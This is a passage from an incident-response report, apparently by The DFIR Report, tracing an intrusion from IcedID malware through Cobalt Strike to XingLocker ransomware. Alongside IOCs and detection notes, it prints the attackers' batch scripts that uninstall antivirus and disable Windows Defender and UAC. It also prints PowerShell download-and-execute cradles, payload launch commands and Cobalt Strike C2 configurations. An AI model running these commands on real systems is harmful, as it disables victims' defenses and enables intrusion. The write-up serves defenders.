{
    "id": "36f2ea79-4279-4a8d-b950-aafce63a941f",
    "created_at": "2023-01-12T15:01:16.48324Z",
    "updated_at": "2025-03-27T02:09:18.795529Z",
    "deleted_at": null,
    "sha1_hash": "f83f00994854404c02adf8ad9cf80a6293b3cded",
    "title": "2021-10-18 - IcedID to XingLocker Ransomware in 24 hours",
    "authors": "",
    "file_creation_date": "2022-05-28T18:04:28Z",
    "file_modification_date": "2022-05-28T18:04:28Z",
    "file_size": 2501437,
    "plain_text": "# IcedID to XingLocker Ransomware in 24 hours\n\n**[thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/](https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/)**\n\n### Intro\n\n\nOctober 18, 2021\n\n\n#### Towards the end of July, we observed an intrusion that began with IcedID malware and ended in XingLocker ransomware, a Mountlocker variant. XingLocker made its first appearance in early May of this year. The new group was featured in the AstroLocker ransomware blog, and it has been very active since then.\n\n\n-----\n\n#### In this intrusion, we observed the threat actors use multiple DLL Beacons that would call out to different Cobalt Strike C2 channels. It appears that operators used different payloads, to accomplish different tasks, on each phase of the intrusion. The threat actors used batch scripts during the intrusion for a number of purposes, primarily to disable antivirus programs and execute payloads.\n\n### Case Summary\n\n#### This case started with an IcedID infection from a malware campaign as reported by Myrtus. As with most commodity malware we see, IcedID executes the initial discovery commands and then exfiltrates the results via the C2 channel. If threat actors find the organization to be of interest, they will launch the next phase. In some cases, there might be different threat actor groups working on different phases of the attack. In this instance, the threat actors instructed IcedID to download and execute the next stage malware two hours after the initial compromise. The payload was a Cobalt Strike Beacon in the form of a DLL.\n\n Upon initial execution, Cobalt Strike ran some discovery commands before injecting into the LSASS process to steal cached credentials. The threat actors did not waste any time, and within four minutes, they gained administrative credentials then began searching for the domain controllers. Once the domain controllers were identified, they used Cobalt Strike’s “jump psexec_psh” capability, which creates a Windows service that executes a Beacon executable to move laterally. Having gained access to the domain controllers, the attackers downloaded and executed AdFind to collect further information about the domain.\n\n\n-----\n\n#### The attacker s preferred scripting various parts of the intrusion via batch scripts. They had a script for persistence, defense evasion and execution tasks. A complete list of those scripts came from hxxps://styservice[.]com as we shared with the community in this tweet thread. The first batch script we saw was to schedule a task which would execute a command to load a Cobalt Strike Beacon into memory using regsvr32. This persistence mechanism was only seen on the domain controllers and one other critical server.\n\n The lateral movement and execution of batch scripts continued with the operators expanding their network footprint. It is worth mentioning that it appears they chose which hosts to pivot to by assessing the importance implied by their hostnames. After landing on an “important” host, the first task was to execute various batch scripts to disable antivirus programs. On one host, common backup utilities were also disabled.\n\n Three hours into the intrusion and the attackers had deployed Beacons across various hosts on the network. Despite that, they deployed another Beacon using a PowerShell loader method, this time on the beachhead. They used this Beacon to run PowerView’s Invoke- ShareFinder module in an effort to discover potentially interesting directories and files. BloodHound was also executed as part their reconnaissance activities. At the same time, the operators performed an exhaustive port scan on the servers they had earlier identified to be “important”. Minutes away from meeting their final objective, the operators manually searched for files and directories of interest for the second time.\n\n Around 23 hours after the initial intrusion, the threat actors moved towards their final objective of deploying XingLocker ransomware. The deployment took place via wmic and batch scripts. We did not observe any overt exfiltration of data; however, it is possible that the threat actors used Cobalt Strike to transmit sensitive data.\n\n### Services\n\n#### We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, BazarLoader, etc. More information on this service and others can be found here.\n\n The Cobalt Strike servers in this case were added to the Threat Feed on 7/19, 7/26 and 7/27.\n\n We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n### Timeline\n\n\n-----\n\n-----\n\n#### Analysis and reporting completed by @kostastsale and @0xtornado\n\n Reviewed by @RoxpinTeddy\n\n## MITRE ATT&CK\n\n### Initial Access\n\n#### The IcedID infection came as a result of a phishing campaign as reported by Myrtus on Twitter.\n\n Initial IcedID was executed on the beachhead using regsvr32.exe\n\n Automated analysis of this IcedID sample extracts the following configuration for the staging server:\n```\n{\n \"Campaign ID\": 1394912167,\n \"C2 url\": \"feedbackfileweb.club\"}\n\n```\n\n-----\n\n#### IcedID core analysis show additional C2 infrastructure as per this sample:\n```\ngsterangsic.buzz\noscanonamik.club\nriderskop.top\niserunifish.club\n\n### Execution\n\n#### Upon the execution of the IcedID sample, we observed a download and execution of a malicious DLL ikaqkk.dll :\n\n```\n\n-----\n\n#### Below is a screenshot of packet where we can spot the GZIPLOADER downloading the first stage from the C2:\n\n A detailed GZIPLOADER analysis from Binary Defense is available here.\n\n The DLL was then executed using rundll32.exe one second later:\n```\nrundll32.exe \"C:\\Users\\REDACTED\\AppData\\Local\\REDACTED\\ikaqkk.dll\",update\n/i:\"TimberMule\\license.dat\"\n\n```\n\n-----\n\n#### Cobalt strike Beacon DLLHost.exe was downloaded and loaded via process hollowing a few hours after the initial IcedID execution:\n\n The threat actors connected to the machine to run the first discovery commands using Cobalt Strike Beacon. The threat actors then downloaded an additional Cobalt Strike Beacon\n```\nkaslose.dll via curl and executed it via regsvr32 :\n\n The Threat actors also executed HTA and PowerShell loader to load Cobalt Strike Beacon in memory on beachhead:\n\n### Persistence\n\n#### IcedID Persistence\n\n```\n\n-----\n\n#### Upon IcedID execution, a scheduled task named {3D0CCC72-D85D-7A63-8C0A```\n66CF5BAFD686} was created. The task was scheduled to execute every hour:\n\n The new scheduled task was registered under EID 106 as seen below. (EIDs: 106,200,201 “Microsoft-Windows-TaskScheduler\\Operational.evtx”)\n\n Correlating this with Process Execution logs from MDE, shows that the task was executing the IcedID downloaded DLL:\n\n Cobalt Strike Persistence\n\n While analyzing this intrusion, we observed further persistence via scheduled tasks associated with post-exploitation activities.\n This scheduled task with name HpSupport executed a Cobalt Strike Beacon\nkaslose64.dll both on the Domain Controller and the File Server:\n\n```\n\n-----\n\n#### On the File Server, the same Scheduled task was created with a slightly different name:\n\n The star.bat script contained the following lines in both cases:\n```\n!echo OFF\nregsvr32 C:\\users\\public\\music\\kaslose64.dll\n\n### Defense Evasion\n\n#### Process Injection: Process Hollowing\n\n IcedID reached out to 37.120.222[.]100:8080 to download and load Cobalt Strike Beacon via process hollowing technique:\n\n Killing multiple Services and Disabling Security Tools\n\n The threat actors executed a 1698 line batch script kasper.bat on a file server, which kills multiple processes using taskill, stops/disables several services using net stop and sc config and disables a number of security tools using WMI.\n\n```\n\n-----\n\n#### Here is an extract from the kasper.bat script:\n```\nstart wmic product where name=\"Webroot SecureAnywhere\" call uninstall /nointeractive\nstart wmic product where name=\"Symantec Endpoint Protection\" call uninstall\n/nointeractive\nstart wmic product where name=\"AVG 2015\" call uninstall /nointeractive\nstart wmic product where name=\"McAfee VirusScan Enterprise\" call uninstall\n/nointeractive\nstart wmic product where name=\"McAfee Agent\" call uninstall /nointeractive\nstart wmic product where name=\"McAfee DLP Endpoint\" call uninstall /nointeractive\nstart wmic product where name=\"McAfee Endpoint Security Platform\" call uninstall\n/nointeractive\nstart wmic product where name=\"McAfee Endpoint Security Threat Prevention\" call\nuninstall /nointeractive\nstart wmic product where name=\"Microsoft Security Client\" call uninstall\n/nointeractive\nstart wmic product where name=\"Malwarebytes' Managed Client\" call uninstall\n/nointeractive\nstart wmic product where name=\"Sophos System Protection\" call uninstall\n/nointeractive\nstart wmic product where name=\"Sophos AutoUpdate\" call uninstall /nointeractive\nstart wmic product where name=\"Sophos Remote Management System\" call uninstall\n/nointeractive\nstart wmic product where name=\"McAfee SiteAdvisor Enterprise\" call uninstall\n/nointeractive\nstart wmic product where name=\"Symantec Backup Exec Remote Agent for Windows\" call\nuninstall /nointeractive\nstart wmic product where name=\"ESET File Security\" call uninstall /nointeractive\nreg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v\nEnableLUA /t REG_DWORD /d 0 /f\npowershell.exe Set-MpPreference -DisableRealtimeMonitoring $true\npowershell.exe Uninstall-WindowsFeature -Name Windows-Defender\n\n Disabling Windows Defender using multiple techniques\n\n The threat actors executed three other scripts named fed1.bat, fed2.bat and\nfed3.bat using PowerShell and manipulating several registry keys to disable Windows\n\n Defender.\n\n Content of fed1.bat script:\n\n```\n\n-----\n\n```\n@echo off\npowershell.exe Set-MpPreference -DisableRealtimeMonitoring $true\npowershell.exe Uninstall-WindowsFeature -Name Windows-Defender\nREG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t\nREG_DWORD /d 1 /f\nrem USE AT OWN RISK AS IS WITHOUT WARRANTY OF ANY KIND !!!!!\nrem https://technet.microsoft.com/en-us/itpro/powershell/windows/defender/setmppreference\nrem To also disable Windows Defender Security Center include this\nrem reg add \"HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService\" /v \"Start\"\n/t REG_DWORD /d \"4\" /f\nrem 1 - Disable Real-time protection\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\"\n/t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t\nREG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\"\n/t REG_DWORD /d \"0\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\n\"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\n\"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\n\"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\n\"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\n\"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v\n\"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v\n\"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v\n\"SpynetReporting\" /t REG_DWORD /d \"0\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v\n\"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f\n\n#### Content of fed2.bat script:\n\n```\n\n-----\n\n```\n@echo off\nrem 0 - Disable Logging\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v\n\"Start\" /t REG_DWORD /d \"0\" /f\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v\n\"Start\" /t REG_DWORD /d \"0\" /f\nrem Disable WD Tasks\nschtasks /Change /TN \"Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\"\n/Disable\nschtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache\nMaintenance\" /Disable\nschtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\"\n/Disable\nschtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled\nScan\" /Disable\nschtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender\nVerification\" /Disable\nrem Disable WD systray icon\nreg delete\n\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /v\n\"Windows Defender\" /f\nreg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Windows Defender\"\n/f\nreg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WindowsDefender\"\n/f\nrem Remove WD context menu\nreg delete \"HKCR\\*\\shellex\\ContextMenuHandlers\\EPP\" /f\nreg delete \"HKCR\\Directory\\shellex\\ContextMenuHandlers\\EPP\" /f\nreg delete \"HKCR\\Drive\\shellex\\ContextMenuHandlers\\EPP\" /f\nrem Disable WD services\nreg add \"HKLM\\System\\CurrentControlSet\\Services\\WdBoot\" /v \"Start\" /t REG_DWORD /d\n\"4\" /f\nreg add \"HKLM\\System\\CurrentControlSet\\Services\\WdFilter\" /v \"Start\" /t REG_DWORD /d\n\"4\" /f\nreg add \"HKLM\\System\\CurrentControlSet\\Services\\WdNisDrv\" /v \"Start\" /t REG_DWORD /d\n\"4\" /f\nreg add \"HKLM\\System\\CurrentControlSet\\Services\\WdNisSvc\" /v \"Start\" /t REG_DWORD /d\n\"4\" /f\nreg add \"HKLM\\System\\CurrentControlSet\\Services\\WinDefend\" /v \"Start\" /t REG_DWORD /d\n\"4\" /f\nreg add \"HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService\" /v \"Start\" /t\nREG_DWORD /d \"4\" /f\nrem Run \"Disable WD.bat\" again to disable WD services\nREG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t\nREG_DWORD /d 1 /f\n\n#### Content of fed3.bat script:\n\n```\n\n-----\n\n```\n@echo off\nrem USE AT OWN RISK AS IS WITHOUT WARRANTY OF ANY KIND !!!!!\nrem https://technet.microsoft.com/en-us/itpro/powershell/windows/defender/setmppreference\nrem To also disable Windows Defender Security Center include this\nrem reg add \"HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService\" /v \"Start\"\n/t REG_DWORD /d \"4\" /f\nrem 1 - Disable Real-time protection\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\"\n/t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t\nREG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\"\n/t REG_DWORD /d \"0\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\n\"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\n\"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\n\"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\n\"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v\n\"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v\n\"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v\n\"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v\n\"SpynetReporting\" /t REG_DWORD /d \"0\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v\n\"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f\nrem 0 - Disable Logging\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v\n\"Start\" /t REG_DWORD /d \"0\" /f\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v\n\"Start\" /t REG_DWORD /d \"0\" /f\nrem Disable WD Tasks\nschtasks /Change /TN \"Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\"\n/Disable\nschtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache\nMaintenance\" /Disable\nschtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\"\n/Disable\nschtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled\nScan\" /Disable\nschtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender\nVerification\" /Disable\nrem Disable WD systray icon\nreg delete\n\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /v\n\"Windows Defender\" /f\nreg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Windows Defender\"\n/f\n\n```\n\n-----\n\n```\nreg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsDefender \n/f\nrem Remove WD context menu\nreg delete \"HKCR\\*\\shellex\\ContextMenuHandlers\\EPP\" /f\nreg delete \"HKCR\\Directory\\shellex\\ContextMenuHandlers\\EPP\" /f\nreg delete \"HKCR\\Drive\\shellex\\ContextMenuHandlers\\EPP\" /f\nrem Disable WD services\nreg add \"HKLM\\System\\CurrentControlSet\\Services\\WdBoot\" /v \"Start\" /t REG_DWORD /d\n\"4\" /f\nreg add \"HKLM\\System\\CurrentControlSet\\Services\\WdFilter\" /v \"Start\" /t REG_DWORD /d\n\"4\" /f\nreg add \"HKLM\\System\\CurrentControlSet\\Services\\WdNisDrv\" /v \"Start\" /t REG_DWORD /d\n\"4\" /f\nreg add \"HKLM\\System\\CurrentControlSet\\Services\\WdNisSvc\" /v \"Start\" /t REG_DWORD /d\n\"4\" /f\nreg add \"HKLM\\System\\CurrentControlSet\\Services\\WinDefend\" /v \"Start\" /t REG_DWORD /d\n\"4\" /f\nreg add \"HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService\" /v \"Start\" /t\nREG_DWORD /d \"4\" /f\nrem Run \"Disable WD.bat\" again to disable WD services\n\n#### It appears that the information from these 3 scripts were lifted from the first revision of Revisions · quick-disable-windows-defender.bat · GitHub. Fed1 is half of that batch file and Fed2 is the other half. Fed3 is a complete copy. This tells us that the threat actor was not aware of what was in these scripts or else they wouldn’t have ran fed1/fed2 and fed3 considering they do the same thing.\n\n### Credential Access\n\n#### The threat actors injected into a high privileged process and then access cached credentials from LSASS:\n\n Related named pipe activity based on Cobalt Strike patterns for using Mimikatz Pass-The- Hash function to run local and remote commands. The named pipe was used to pass the results back to the Beacon process.\n\n```\n\n-----\n\n#### Windows EID: 4673 – A privileged service was called:\n\n### Discovery\n\n#### IcedID initial Environment Discovery\n\n Several discovery commands executed from IcedID after the initial execution:\n```\nipconfig /all\ncmd.exe /c chcp >&2\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get *\n/Format:List\nsysteminfo\nnet config workstation\nnltest /domain_trusts\nnltest /domain_trusts /all_trusts\nnet view /all /domain\nnet view /all\nnet group \"Domain Admins\" /domain\n\n Cobalt Strike Beacon Discovery\n\n Cobalt Strike’s appino Beacon, ran discovery commands upon initial execution:\n\n```\n\n-----\n\n```\ncmd.exe /C ping n 1<redacted>\ncmd.exe /C ping -n 1 <redacted>\ncmd.exe /C nltest /domain_trusts&nltest /dclist:&c:\\windows\\sysnative\\nltest\n/domain_trusts&c:\\windows\\sysnative\\nltest /dclist:\ncmd.exe /C netstat -a -n -p tcp | find \"ESTAB\"\ncmd.exe /C net group \"domain Admins\" /DOMAIN\ncmd.exe /C net group \"Domain Computers\" /DOMAIN\ncmd.exe /C ipconfig /all\n\n#### Active Directory Domain Discovery\n\n Discovering domain controllers prior to pivoting:\n\n After discovering and pivoting to the Domain Controller, threat actors used both AdFind and BloodHound to explore the Active Directory Domain.\n Executing Adfind on the Domain Controller:\n\n Evidence of BloodHound execution on the Domain Controller:\n\n The threat actors also executed PowerView Invoke-ShareFinder module on the beachhead host:\npowershell -nop -exec bypass -EncodedCommand\nSQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG\n\n```\n\n-----\n\n#### Decoded command:\n```\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:10966/'); InvokeShareFinder -CheckShareAccess\n\n The threat actors also executed PowerView Invoke-FindLocalAdminAccess module on one of the compromised servers:\npowershell -nop -exec bypass -EncodedCommand\nSQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG\n\n Decoded command:\nIEX (New-Object Net.Webclient).DownloadString('http://localhost:37923/'); InvokeFindLocalAdminAccess -threads 50\n\n We also saw exhaustive port scanners of certain servers before additional discovery.\n\n File and Directory Discovery\n\n```\n\n-----\n\n#### The following discovery commands were run on all hosts including the Domain Controllers:\n\n### Lateral Movement\n\n#### The first Lateral Movement to the Domain Controller was performed using remote services creation (Executing spoolsv.exe via remote services):\n\n The spoolsv.exe binary is a Cobalt Strike artifact used for Lateral Movement and C2 which decodes to the configuration below:\n\n\n-----\n\n```\n{\n \"BeaconType\": [\n  \"HTTPS\"\n ],\n \"Port\": 443,\n \"SleepTime\": 4000,\n \"MaxGetSize\": 1403644,\n \"Jitter\": 37,\n \"C2Server\": \"kaslose.com,/jquery-3.3.1.min.js\",\n \"HttpPostUri\": \"/jquery-3.3.2.min.js\",\n \"Malleable_C2_Instructions\": [\n  \"Remove 1522 bytes from the end\",\n  \"Remove 84 bytes from the beginning\",\n  \"Remove 3931 bytes from the beginning\",\n  \"Base64 URL-safe decode\",\n  \"XOR mask w/ random key\"\n ],\n \"SpawnTo\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n \"HttpGet_Verb\": \"GET\",\n \"HttpPost_Verb\": \"POST\",\n \"HttpPostChunk\": 0,\n \"Spawnto_x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n \"Spawnto_x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n \"CryptoScheme\": 0,\n \"Proxy_Behavior\": \"Use IE settings\",\n \"Watermark\": 0,\n \"bStageCleanup\": \"True\",\n \"bCFGCaution\": \"False\",\n \"KillDate\": 0,\n \"bProcInject_StartRWX\": \"False\",\n \"bProcInject_UseRWX\": \"False\",\n \"bProcInject_MinAllocSize\": 17500,\n \"ProcInject_PrependAppend_x86\": [\n  \"kJA=\",\n  \"Empty\"\n ],\n \"ProcInject_PrependAppend_x64\": [\n  \"kJA=\",\n  \"Empty\"\n ],\n \"ProcInject_Execute\": [\n  \"ntdll:RtlUserThreadStart\",\n  \"CreateThread\",\n  \"NtQueueApcThread-s\",\n  \"CreateRemoteThread\",\n  \"RtlCreateUserThread\"\n ],\n \"ProcInject_AllocationMethod\": \"NtMapViewOfSection\",\n \"bUsesCookies\": \"True\",\n \"HostHeader\": \"\"}\n\n#### Additional Lateral Movement technique was observed, where the threat actors used Cobalt Strike’s jump psexec_psh :\n\n```\n\n-----\n\n#### Using Cyberchef (recipe), we decoded the obfuscated powershell loader, which is using the default named pipe \\.\\pipe\\status_f5 :\n\n Threat actors also pivoted to a domain controller by using the same Cobalt Strike artifacts,\n```\nspoolsv.exe via remote service creation:\n\n Right after initial Lateral Movement, a second Cobalt Strike Beacon kaslose64.dll was executed on a critical server.\n\n```\n\n-----\n\n### Command and Control\n\n#### Rita stands for Real Intelligence Threat Analytics (RITA), developed by Active Countermeasures. Rita is a framework for identifying command and control communication, also known as beaconing. As the name implies, beaconing refers to delivering regular messages from an infected host to an attacker-controlled host. Beacon is the malware agent installed on the victim’s device and is responsible for communicating with the C2 server. Rita is consuming zeek/bro logs and detecting suspected beaconing activity using network traffic calculations.\n\n It then assigns a value ranging from 0.1 to 1.0, with the greater the score indicating that the network activity is suspicious. Rita is utilized as a hunting tool rather than a real-time detection tool, though simple scripting allows Rita to be used for live traffic analysis. However, analysts should add additional context and filter the results accordingly. Rita can only identify suspicious communication and should not be automated as a preventative control. For more info on how RITA works check out the mathamatics here.\n\n Using with this case network traffic RITA was able to identify all active Beacons from the impacted hosts in the network as seen in the screenshot below:\n\n IcedID:\n```\ngsterangsic.buzz\noscanonamik.club\nriderskop.top\niserunifish.club\n5.61.46.161\n176.97.64.194\n\n```\n\n-----\n\n```\nJA3:a0e9f5d64349fb13191bc781f81f42e1\nJA3s:ec74a5c51106f0419184d0dd08fb05bc\nCertificate: [f8:4e:05:70:39:7b:8a:81:d3:0e:09:be:3c:68:14:00:d2:6d:8c:07]\nNot Before: 2021/07/21 14:07:11 UTC \nNot After: 2022/07/21 14:07:11 UTC \nIssuer Org: Internet Widgits Pty Ltd \nSubject Common: localhost \nSubject Org: Internet Widgits Pty Ltd \nPublic Algorithm: rsaEncryption\nJA3:a0e9f5d64349fb13191bc781f81f42e1\nJA3s:ec74a5c51106f0419184d0dd08fb05bc\nCertificate: [87:19:1c:7c:0f:4e:e0:96:5c:b4:c9:de:a0:41:47:dd:5a:ef:4e:c4]\nNot Before: 2021/07/21 06:53:48 UTC \nNot After: 2022/07/21 06:53:48 UTC \nIssuer Org: Internet Widgits Pty Ltd \nSubject Common: localhost \nSubject Org: Internet Widgits Pty Ltd \nPublic Algorithm: rsaEncryption\n\n#### Cobalt Strike C2 configuration:\n\n kaslose.com (146.70.24.186) – This Cobalt Strike server was added to our Threat Feed on 07/19/2021.\nJA3:a0e9f5d64349fb13191bc781f81f42e1\nJA3s:ae4edc6faf64d08308082ad26be60767\nCertificate: [7e:6c:72:b8:83:e3:9f:28:e0:af:06:45:2b:73:73:f1:86:89:cc:d7]\nNot Before: 2021/07/20 15:53:12 UTC \nNot After: 2021/10/18 15:53:10 UTC \nIssuer Org: Let's Encrypt \nSubject Common: kaslose.com [kaslose.com ]\nPublic Algorithm: rsaEncryption\n\n```\n\n-----\n\n```\n{\n  \"x64\": {\n    \"sha256\": \"8cbd66dd196a5c54549dc350fa1734dddcff2da782a4a0682e8a79de7bbdf505\",\n    \"sha1\": \"65c4379c9bcca13c4e357bf6cc60af4ced8090a2\",\n    \"uri_queried\": \"/4Ovd\",\n    \"config\": {\n      \"Watermark\": 0,\n      \"Method 2\": \"POST\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n      \"Beacon Type\": \"8 (HTTPS)\",\n      \"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\",\n      \"C2 Host Header\": \"\",\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n      \"C2 Server\": \"kaslose.com,/jquery-3.3.1.min.js\",\n      \"Jitter\": 37,\n      \"Method 1\": \"GET\",\n      \"Port\": 443,\n      \"Polling\": 4000\n    },\n    \"time\": 1629006465815.1,\n    \"md5\": \"af56c32d3d6e5ffa8b20a97580e59656\"\n  },\n  \"x86\": {\n    \"sha256\": \"56ab98d818638b3108505e9778c2c0d021b9f71f882abf1626098780560e435d\",\n    \"sha1\": \"c216520a8b30894cbd529bfb805dca7c253b85f6\",\n    \"uri_queried\": \"/HjIa\",\n    \"config\": {\n      \"Watermark\": 0,\n      \"Method 2\": \"POST\",\n      \"Spawn To x86\": \"%windir%\\\\syswow64\\\\dllhost.exe\",\n      \"Beacon Type\": \"8 (HTTPS)\",\n      \"HTTP Method Path 2\": \"/jquery-3.3.2.min.js\",\n      \"C2 Host Header\": \"\",\n      \"Spawn To x64\": \"%windir%\\\\sysnative\\\\dllhost.exe\",\n      \"C2 Server\": \"kaslose.com,/jquery-3.3.1.min.js\",\n      \"Jitter\": 37,\n      \"Method 1\": \"GET\",\n      \"Port\": 443,\n      \"Polling\": 4000\n    },\n    \"time\": 1629006464435.3,\n    \"md5\": \"5fe82e1ccc5a68c39f314aad79f16cbb\"\n  }\n}\n\n#### The following Cobalt Strike server was added to our Threat Feed on 07/26/2021.\ncdnsharepoi.xyz\ncdnchrome.xyz\n134.195.90.187:80\n134.195.90.186:80\n134.195.90.185:80\n\n HTTP User Agent:\n\n```\n\n-----\n\n```\nMozilla/5.0 (Windows NT 6.2; WOW64; Trident/5.0; rv:11.0) like Gecko 20210505604\nJA3:a0e9f5d64349fb13191bc781f81f42e1\nJA3s:fd4bc6cea4877646ccd62f0792ec0b62\nCertificate: [5c:d1:8b:c9:51:f2:5b:ed:ad:fe:6a:1e:c8:9c:ec:7f:29:12:7b:b2]\nNot Before: 2021/06/07 17:50:37 UTC \nNot After: 2021/09/05 17:50:37 UTC \nIssuer Org: Let's Encrypt \nSubject Common: cdnwin.xyz [cdnwin.xyz ]\nPublic Algorithm: rsaEncryption\n\n#### Based on the Subject Common name (cdnwin.xyz) we can see that there are 5 Cobalt Strike servers associated with this group all hosted on HostHatch, and registered by NameCheap. Still online as of 10/10/2021\n134.195.90.185-134.195.90.189\n\n```\n\n-----\n\n```\n{\n  \"BeaconType\": [\n    \"HTTP\"\n  ],\n  \"Port\": 80,\n  \"SleepTime\": 10000,\n  \"MaxGetSize\": 1398191,\n  \"Jitter\": 10,\n  \"C2Server\":\n\"134.195.90.186,/updates/query_result.php,134.195.90.185,/updates/query_result.php,cdn\n  \"HttpPostUri\": \"/updates/lims.php\",\n  \"Malleable_C2_Instructions\": [\n    \"Remove 